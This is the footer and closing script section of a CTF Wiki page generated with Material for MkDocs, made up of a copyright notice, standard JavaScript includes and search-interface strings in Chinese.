    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2020 CTF Wiki Team
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/vendor.a018d6bb.min.js"></script>
      <script src="../../../../assets/javascripts/bundle.4b42b5e6.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../../..",
          features: ['tabs'],
          search: Object.assign({
            worker: "../../../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>